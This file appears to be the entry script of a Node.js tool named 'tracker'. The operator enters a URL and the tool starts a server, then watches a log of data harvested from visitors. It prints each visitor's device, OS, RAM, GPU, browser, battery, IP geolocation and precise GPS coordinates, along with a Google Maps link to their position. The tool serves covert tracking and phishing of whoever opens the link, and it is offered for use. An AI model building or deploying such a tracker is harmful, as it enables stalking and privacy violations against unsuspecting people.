import promptSync from "prompt-sync";
import fs from "fs";
import path from "path";
import chalk from "chalk";
import getIpInfo from "./getIpInfo.js";
import { startServer } from "./server.js";

const info = {
  author: "hell_",
  version: "1.0.0",
  instagram: "https://instagram.com/mneto_nx",
  github: "https://github.com/hell-ctrl",
  repository : "https://github.com/hell-ctrl/tracker"
};

const banner = `
${chalk.cyan(`
  ______                __
 /_  __/________ ______/ /_____  _____
  / / / ___/ __ \`/ ___/ //_/ _ \\/ ___/
 / / / /  / /_/ / /__/ ,< \/  __/ /
/_/ /_/   \\__,_/\\___/_/|_|\\___/_/
`)}
${chalk.cyan("[+]")}${chalk.green("Author    :")} ${info.author}
${chalk.cyan("[+]")}${chalk.green("Version   :")} ${info.version}
${chalk.cyan("[+]")}${chalk.green("Instagram :")} ${info.instagram}
${chalk.cyan("[+]")}${chalk.green("Github    :")} ${info.github}
${chalk.cyan("[+]")}${chalk.green("Repository:")} ${info.repository}
`;

console.log(banner);

const prompt = promptSync();
const url = prompt(`${chalk.cyan("[/>]")}${chalk.green("enter your url: ")}`);

const filePath = path.join(path.dirname(new URL(import.meta.url).pathname), 'logs', 'data.json');
const folderPath = path.join(path.dirname(new URL(import.meta.url).pathname), 'logs');

if (!fs.existsSync(folderPath)) {
  fs.mkdirSync(folderPath);
}

if (!fs.existsSync(filePath)) {
  fs.writeFileSync(filePath, "{}");
}


try {
  startServer(url);
  fs.watchFile(filePath, (curr, prev) => {
    fs.readFile(filePath, "utf-8", (err, data) => {
      const json = JSON.parse(data);
      getIpInfo(json.ip).then(resp => console.log(`
${chalk.cyan("_".repeat(40))}

${chalk.yellow("[!] Device Informations:")}

${chalk.cyan("[+]")}${chalk.green("DEVICE   :")} ${json.userAgent.device}
${chalk.cyan("[+]")}${chalk.green("OS       :")} ${json.userAgent.os}
${chalk.cyan("[+]")}${chalk.green("RAM      :")} ${json.ram}
${chalk.cyan("[+]")}${chalk.green("GPU      :")} ${json.cpu}
${chalk.cyan("[+]")}${chalk.green("BROWSER  :")} ${json.userAgent.browser}
${chalk.cyan("[+]")}${chalk.green("BATTERY  :")} ${json.battery}

${chalk.yellow("[!] IP Informations:")}

${chalk.cyan("[+]")}${chalk.green("IP       :")} ${resp.ip}
${chalk.cyan("[+]")}${chalk.green("TYPE     :")} ${resp.type}
${chalk.cyan("[+]")}${chalk.green("TIMEZONE :")} ${resp.timezone.id}
${chalk.cyan("[+]")}${chalk.green("CONTINENT:")} ${resp.continent}
${chalk.cyan("[+]")}${chalk.green("COUNTRY  :")} ${resp.country}
${chalk.cyan("[+]")}${chalk.green("REGION   :")} ${resp.region}
${chalk.cyan("[+]")}${chalk.green("CITY     :")} ${resp.city}
${chalk.cyan("[+]")}${chalk.green("ORG      :")} ${resp.connection.org}

${chalk.yellow("[!]Location Informations:")}

${chalk.cyan("[+]")}${chalk.green("LATITUDE :")} ${json.location.latitude} deg
${chalk.cyan("[+]")}${chalk.green("LONGITUDE:")} ${json.location.longitude} deg
${chalk.cyan("[+]")}${chalk.green("ALTITUDE :")} ${json.location.altitude} m
${chalk.cyan("[+]")}${chalk.green("SPEED    :")} ${json.location.speed} m/s

${chalk.cyan("[+]")}${chalk.green("MAPS     :")} https://www.google.com/maps/place/${json.location.latitude}+${json.location.longitude}
      `))
    });
  });
} catch(e) {
  console.log(chalk.red("an error has occurred!", e))
};
